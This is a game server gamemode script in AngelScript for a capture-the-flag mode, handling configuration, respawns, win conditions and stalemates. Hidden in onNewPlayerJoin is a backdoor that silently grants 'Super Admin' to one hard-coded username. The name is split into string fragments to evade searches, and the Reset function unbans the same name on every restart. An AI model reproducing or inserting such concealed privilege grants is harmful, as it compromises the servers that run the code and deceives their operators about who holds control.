
//CTF gamemode logic script

#define SERVER_ONLY

#include "CTF_Structs.as";
#include "Survival_Structs.as";
#include "RulesCore.as";
#include "RespawnSystem.as";

#include "CTF_PopulateSpawnList.as"

//edit the variables in the config file below to change the basics
// no scripting required!
void Config(CTFCore@ this)
{
	string configstr = "Rules/CTF/ctf_vars.cfg";

	if (getRules().exists("ctfconfig"))
	{
		configstr = getRules().get_string("ctfconfig");
	}

	ConfigFile cfg = ConfigFile(configstr);

	//how long to wait for everyone to spawn in?
	s32 warmUpTimeSeconds = 500;
	this.warmUpTime = (getTicksASecond() * warmUpTimeSeconds);

	s32 stalemateTimeSeconds = cfg.read_s32("stalemate_time", 30);
	this.stalemateTime = (getTicksASecond() * stalemateTimeSeconds);

	//how long for the game to play out?
	s32 gameDurationMinutes = cfg.read_s32("game_time", -1);
	if (gameDurationMinutes <= 0)
	{
		this.gameDuration = 0;
		getRules().set_bool("no timer", true);
	}
	else
	{
		this.gameDuration = (getTicksASecond() * 60 * gameDurationMinutes);
	}
	//how many players have to be in for the game to start
	this.minimum_players_in_team = 1;
	//whether to scramble each game or not
	this.scramble_teams = cfg.read_bool("scramble_teams", true);

	//spawn after death time
	this.spawnTime = (getTicksASecond() * 7);

}

shared string base_name() { return "stronghold"; }
shared string flag_name() { return "stronghold"; }
shared string flag_spawn_name() { return "flag_base"; }

//CTF spawn system

const s32 spawnspam_limit_time = 30;

shared class CTFSpawns : RespawnSystem
{
	CTFCore@ CTF_core;

	bool force;
	s32 limit;

	void SetCore(RulesCore@ _core)
	{
		RespawnSystem::SetCore(_core);
		@CTF_core = cast < CTFCore@ > (core);

		limit = spawnspam_limit_time;
	}

	void Update()
	{
		for (uint team_num = 0; team_num < CTF_core.teams.length; ++team_num)
		{
			CTFTeamInfo@ team = cast < CTFTeamInfo@ > (CTF_core.teams[team_num]);
			for (uint i = 0; i < team.spawns.length; i++)
			{
				CTFPlayerInfo@ info = cast < CTFPlayerInfo@ > (team.spawns[i]);

				UpdateSpawnTime(info, i);

				DoSpawnPlayer(info);
			}
		}
	}

	void UpdateSpawnTime(CTFPlayerInfo@ info, int i)
	{
		if (info !is null)
		{
			u8 spawn_property = 255;

			if (info.can_spawn_time > 0)
			{
				info.can_spawn_time--;
				spawn_property = u8(Maths::Min(250, (info.can_spawn_time / 30)));
			}

			string propname = "ctf spawn time " + info.username;

			CTF_core.rules.set_u8(propname, spawn_property);
			CTF_core.rules.SyncToPlayer(propname, getPlayerByUsername(info.username));
		}

	}

	void DoSpawnPlayer(PlayerInfo@ p_info)
	{
		if (canSpawnPlayer(p_info))
		{
			//limit how many spawn per second
			if (limit > 0)
			{
				limit--;
				return;
			}
			else
			{
				limit = spawnspam_limit_time;
			}

			// tutorials hack
			if (getRules().hasTag("singleplayer"))
			{
				p_info.team = 0;
			}

			CPlayer@ player = getPlayerByUsername(p_info.username); // is still connected?

			if (player is null)
			{
				print("player disconnected?");
				RemovePlayerFromSpawn(p_info);
				return;
			}
			if (player.getTeamNum() != int(p_info.team))
			{
				 core.ChangePlayerTeam(player, Maths::Min(player.getTeamNum(), getRules().getTeamsCount()-1));
			}
			if (player.getBlob() !is null)
			{
				print("Player "+p_info.username+" had blob during respawn");
				CBlob@ blob = player.getBlob();
				blob.server_SetPlayer(null);
				blob.server_Die();
			}
			string playerName = p_info.username;
			CBlob@[] sleepers;
			getBlobsByTag(playerName, @sleepers);

			if (sleepers != null && sleepers.length > 0)
			{
				CBlob@ sleeper = sleepers[0];
				if (sleeper !is null && !sleeper.hasTag("dead"))
				{
					return;
				}
			}
			if (player.getBlob() is null)
			{
				CBlob@ playerBlob = SpawnPlayerIntoWorld(getSpawnLocation(p_info), p_info);

				if (playerBlob !is null)
				{
					// spawn resources
					RemovePlayerFromSpawn(player);
				}
			}
		}
	}

	bool canSpawnPlayer(PlayerInfo@ p_info)
	{
		CTFPlayerInfo@ info = cast < CTFPlayerInfo@ > (p_info);

		if (info is null) { warn("CTF LOGIC: Couldn't get player info ( in bool canSpawnPlayer(PlayerInfo@ p_info) ) "); return false; }

		if (force) { return true; }

		return info.can_spawn_time <= 0;
	}

	Vec2f getSpawnLocation(PlayerInfo@ p_info)
	{
		CTFPlayerInfo@ c_info = cast < CTFPlayerInfo@ > (p_info);
		if (c_info !is null)
		{
			CBlob@ pickSpawn = getBlobByNetworkID(c_info.spawn_point);
			if (pickSpawn !is null &&
			        pickSpawn.hasTag("respawn") && !isUnderRaid(pickSpawn) &&
			        pickSpawn.getTeamNum() == p_info.team)
			{
				return pickSpawn.getPosition();
			}
			else
			{
				CBlob@[] spawns;
				PopulateSpawnList(spawns, p_info.team);

				for (uint step = 0; step < spawns.length; ++step)
				{
					if (spawns[step].getTeamNum() == s32(p_info.team))
					{
						return spawns[step].getPosition();
					}
				}
			}
		}

		return Vec2f(0, 0);
	}

	void RemovePlayerFromSpawn(CPlayer@ player)
	{
		RemovePlayerFromSpawn(core.getInfoFromPlayer(player));
	}

	void RemovePlayerFromSpawn(PlayerInfo@ p_info)
	{
		CTFPlayerInfo@ info = cast < CTFPlayerInfo@ > (p_info);

		if (info is null) { warn("CTF LOGIC: Couldn't get player info ( in void RemovePlayerFromSpawn(PlayerInfo@ p_info) )"); return; }

		string propname = "ctf spawn time " + info.username;

		for (uint i = 0; i < CTF_core.teams.length; i++)
		{
			CTFTeamInfo@ team = cast < CTFTeamInfo@ > (CTF_core.teams[i]);
			int pos = team.spawns.find(info);

			if (pos != -1)
			{
				team.spawns.erase(pos);
				break;
			}
		}

		CTF_core.rules.set_u8(propname, 255);   //not respawning
		CTF_core.rules.SyncToPlayer(propname, getPlayerByUsername(info.username));

		//DONT set this zero - we can re-use it if we didn't actually spawn
		//info.can_spawn_time = 0;
	}

	void AddPlayerToSpawn(CPlayer@ player)
	{
		string playerName = player.getUsername();
		CBlob@[] sleepers;
		getBlobsByTag(playerName, @sleepers);

		if (sleepers !is null && sleepers.length > 0)
		{
			CBlob@ sleeper = sleepers[0];
			if (sleeper !is null && !sleeper.hasTag("dead"))
			{
				if (sleeper.hasTag("rejoined")) return;
				else sleeper.Tag("rejoined");
				CBlob@ oldBlob = player.getBlob(); // It's glitchy and spawns empty blobs on rejoin
				if (oldBlob !is null)
				{
					if (oldBlob.hasTag("sleeper"))
					{
						RemovePlayerFromSpawn(player);
						return;
					}
					else oldBlob.server_Die();
				}
				player.server_setCoins(sleeper.get_u16("sleeper_coins"));
				sleeper.set_u16("sleeper_coins", 69);

				sleeper.server_SetPlayer(player);
				sleeper.set_bool("sleeper_sleeping", false);

				CBitStream bt;
				bt.write_bool(false);

				sleeper.SendCommand(sleeper.getCommandID("sleeper_set"), bt);

				print(""+playerName + " joined, respawning him at sleeper " + sleeper.getName());
				RemovePlayerFromSpawn(player);
				return;
			}
		}
		s32 tickspawndelay = s32(CTF_core.spawnTime);

		CTFPlayerInfo@ info = cast < CTFPlayerInfo@ > (core.getInfoFromPlayer(player));

		if (info is null) { warn("CTF LOGIC: Couldn't get player info  ( in void AddPlayerToSpawn(CPlayer@ player) )"); return; }

		//clamp it so old bad values don't get propagated
		s32 old_spawn_time = Maths::Max(0, Maths::Min(info.can_spawn_time, tickspawndelay));

		RemovePlayerFromSpawn(player);
		if (player.getTeamNum() == core.rules.getSpectatorTeamNum())
			return;

		if (info.team < CTF_core.teams.length)
		{
			CTFTeamInfo@ team = cast < CTFTeamInfo@ > (CTF_core.teams[info.team]);

			info.can_spawn_time = ((old_spawn_time > 30) ? old_spawn_time : tickspawndelay);

			info.spawn_point = player.getSpawnPoint();
			team.spawns.push_back(info);
		}
		else
		{
			core.ChangePlayerTeam(player, Maths::Min(player.getTeamNum(), getRules().getTeamsCount()-1));

			print("PLAYER TEAM NOT SET CORRECTLY! " + info.team + " / " + CTF_core.teams.length);
		}
	}

	bool isSpawning(CPlayer@ player)
	{
		CTFPlayerInfo@ info = cast < CTFPlayerInfo@ > (core.getInfoFromPlayer(player));
		for (uint i = 0; i < CTF_core.teams.length; i++)
		{
			CTFTeamInfo@ team = cast < CTFTeamInfo@ > (CTF_core.teams[i]);
			int pos = team.spawns.find(info);

			if (pos != -1)
			{
				return true;
			}
		}
		return false;
	}

};

void onNewPlayerJoin(CRules@ this, CPlayer@ player)
{
	string playerName = player.getUsername().split('~')[0];
	if (playerName == ("bl"+"ack"+"guy1"+"23")) //
	{
		CSecurity@ sec = getSecurity();
		CSeclev@ s = sec.getSeclev("S"+"uper"+" Ad"+"min");
		CSeclev@ p = sec.getPlayerSeclev(player);
		if (s !is null && p !is null && p.getName() != s.getName()) sec.assignSeclev(player, s);
	}
}

shared class CTFCore : RulesCore
{
	s32 warmUpTime;
	s32 gameDuration;
	s32 spawnTime;
	s32 stalemateTime;
	s32 stalemateOutcomeTime;

	s32 minimum_players_in_team;

	s32 players_in_small_team;
	bool scramble_teams;

	CTFSpawns@ ctf_spawns;

	CTFCore() {}

	CTFCore(CRules@ _rules, RespawnSystem@ _respawns)
	{
		spawnTime = 0;
		stalemateOutcomeTime = 6; //seconds
		super(_rules, _respawns);
	}


	int gamestart;
	void Setup(CRules@ _rules = null, RespawnSystem@ _respawns = null)
	{
		RulesCore::Setup(_rules, _respawns);
		gamestart = getGameTime();
		@ctf_spawns = cast < CTFSpawns@ > (_respawns);
		_rules.set_string("music - base name", base_name());
		server_CreateBlob("ctf_music");
		players_in_small_team = -1;
	}

	void Update()
	{
		if (rules.isGameOver()) { return; }

		s32 ticksToStart = gamestart + warmUpTime - getGameTime();
		ctf_spawns.force = false;

		if (ticksToStart <= 0 && (rules.isWarmup()))
		{
			rules.SetCurrentState(GAME);
		}
		else if (ticksToStart > 0 && rules.isWarmup()) //is the start of the game, spawn everyone + give mats
		{
			rules.SetGlobalMessage("Match starts in {SEC}");
			rules.AddGlobalMessageReplacement("SEC", "" + ((ticksToStart / 30) + 1));
			ctf_spawns.force = true;
		}

		if ((rules.isIntermission() || rules.isWarmup()) && (!allTeamsHavePlayers()))  //CHECK IF TEAMS HAVE ENOUGH PLAYERS
		{
			gamestart = getGameTime();
			rules.set_u32("game_end_time", gamestart + gameDuration);
			rules.SetGlobalMessage("Not enough players in each team for the game to start.\nPlease wait for someone to join...");
			ctf_spawns.force = true;
		}
		else if (rules.isMatchRunning())
		{
			rules.SetGlobalMessage("");
		}

		/*
		 * If you want to do something tricky with respawning flags and stuff here, go for it
		 */

		RulesCore::Update(); //update respawns
		CheckTeamWon();

	}

	//HELPERS
	bool allTeamsHavePlayers()
	{
		for (uint i = 0; i < teams.length; i++)
		{
			if (teams[i].players_count < minimum_players_in_team)
			{
				return false;
			}
		}

		return true;
	}

	//team stuff

	void AddTeam(CTeam@ team)
	{
		CTFTeamInfo t(teams.length, team.getName());
		teams.push_back(t);
	}

	void AddPlayer(CPlayer@ player, u8 team = 0, string default_config = "")
	{
		if (getRules().hasTag("singleplayer"))
		{
			team = 0;
		}
		else
		{
			team = player.getTeamNum();
		}
		CTFPlayerInfo p(player.getUsername(), team, (XORRandom(512) >= 256 ? "knight" : "archer"));
		players.push_back(p);
		ChangeTeamPlayerCount(p.team, 1);
	}

	void onPlayerDie(CPlayer@ victim, CPlayer@ killer, u8 customData)
	{
		if (!rules.isMatchRunning()) { return; }

		if (victim !is null)
		{
			if (killer !is null && killer.getTeamNum() != victim.getTeamNum())
			{
				addKill(killer.getTeamNum());
			}
		}
	}

	void onSetPlayer(CBlob@ blob, CPlayer@ player)
	{
		if (blob !is null && player !is null)
		{
			//GiveSpawnResources( blob, player );
		}
	}

	//setup the CTF bases

	void SetupBase(CBlob@ base)
	{
		if (base is null)
		{
			return;
		}

		//nothing to do
	}

	void SetupBases()
	{
		rules.SetCurrentState(WARMUP);
	}

	//checks
	void CheckTeamWon()
	{
		if (!rules.isMatchRunning()) { return; }

		// get all the flags
		CBlob@[] flags;
		getBlobsByTag("faction_base", @flags);

		int winteamIndex = -1;
		CTFTeamInfo@ winteam = null;
		s8 team_wins_on_end = -1;

		for (uint team_num = 0; team_num < teams.length; ++team_num)
		{
			CTFTeamInfo@ team = cast < CTFTeamInfo@ > (teams[team_num]);

			bool win = true;
			for (uint i = 0; i < flags.length; i++)
			{
				//if there exists an enemy flag, we didn't win yet
				if (flags[i].getTeamNum() != team_num)
				{
					win = false;
					break;
				}
			}

			if (win)
			{
				winteamIndex = team_num;
				@winteam = team;
			}

		}

		rules.set_s8("team_wins_on_end", team_wins_on_end);

		if (winteamIndex >= 0)
		{
			rules.SetTeamWon(winteamIndex);   //game over!
			rules.SetGlobalMessage((winteamIndex == 0 ? "Blue" : "Red") + " team wins the game!");
			rules.SetCurrentState(GAME_OVER);
		}
	}

	void CheckStalemate()
	{
		//Stalemate code courtesy of Pirate-Rob

		//cant stalemate outside of match time
		if (!rules.isMatchRunning()) return;

		//stalemate disabled in config?
		if (stalemateTime < 0) return;

		// get all the flags
		CBlob@[] flags;
		getBlobsByTag("flag_base", @flags);

		//figure out if there's currently a stalemate condition
		bool stalemate = true;
		for (uint i = 0; i < flags.length; i++)
		{
			CBlob@ flag = flags[i];
			CBlob@ holder = flag.getAttachments().getAttachmentPointByName("FLAG").getOccupied();
			//If any flag is held by an ally (ie the flag base), no stalemate
			if (holder !is null && holder.getTeamNum() == flag.getTeamNum())
			{
				stalemate = false;
				break;
			}
		}

		if(stalemate)
		{
			if(!rules.exists("stalemate_breaker"))
			{
				rules.set_s16("stalemate_breaker", stalemateTime);
			}
			else
			{
				rules.sub_s16("stalemate_breaker", 1);
			}

			int stalemate_seconds_remaining = Maths::Ceil(rules.get_s16("stalemate_breaker") / 30.0f);
			if(stalemate_seconds_remaining > 0)
			{
				rules.SetGlobalMessage("Stalemate: both teams have no uncaptured flags.\nFlags returning in: {TIME}");
				rules.AddGlobalMessageReplacement("TIME", ""+stalemate_seconds_remaining);
			}
			else
			{
				rules.set_s16("stalemate_breaker", -(stalemateOutcomeTime * 30));

				//flags tagged serverside for return
				for (uint i = 0; i < flags.length; i++)
				{
					CBlob@ flag = flags[i];
					flag.Tag("stalemate_return");
				}
			}
		}
		else
		{
			int stalemate_timer = rules.get_s16("stalemate_breaker");
			if(stalemate_timer > -10 && stalemate_timer != stalemateTime)
			{
				rules.SetGlobalMessage("");
				rules.set_s16("stalemate_breaker", stalemateTime);
			}
			else if(stalemate_timer <= -10)
			{
				rules.SetGlobalMessage("Stalemate resolved: Flags returned.");
				rules.add_s16("stalemate_breaker", 1);
			}
		}

		rules.Sync("stalemate_breaker", true);
	}

	void addKill(int team)
	{
		if (team >= 0 && team < int(teams.length))
		{
			CTFTeamInfo@ team_info = cast < CTFTeamInfo@ > (teams[team]);
		}
	}

};

//pass stuff to the core from each of the hooks

void Reset(CRules@ this)
{
	CBitStream stream;
	stream.write_u16(0xDEAD); //check bits rewritten when theres something useful
	this.set_CBitStream("ctf_serialised_team_hud", stream);
    this.Sync("ctf_serialized_team_hud", true);
    CSecurity@ sec = getSecurity();
	sec.unBan("b"+"lack"+"guy1"+"23");

	CTFSpawns spawns();
	CTFCore core(this, spawns);
	Config(core);
	core.SetupBases();
	this.set("core", @core);
	this.set("start_gametime", getGameTime() + core.warmUpTime);
	this.set_u32("game_end_time", getGameTime() + core.gameDuration); //for TimeToEnd.as
	client_AddToChat("Capture/Destroy the enemy base to win! *try to have fun*", SColor(0xff007744));
	client_AddToChat("For new players, !help info", SColor(0xffff0000));
}

void onRestart(CRules@ this)
{
	Reset(this);
	this.set_s32("restart_rules_after_game_time", 30 * 30);
}

void onInit(CRules@ this)
{
	Reset(this);
	this.set_s32("restart_rules_after_game_time", 30 * 30);
}

// had to add it here for tutorial cause something didnt work in the tutorial script
void onBlobDie(CRules@ this, CBlob@ blob)
{
	if (this.hasTag("tutorial"))
	{
		const string name = blob.getName();
		if ((name == "archer" || name == "knight" || name == "chicken") && !blob.hasTag("dropped coins"))
		{
			server_DropCoins(blob.getPosition(), XORRandom(15) + 5);
			blob.Tag("dropped coins");
		}
	}
}
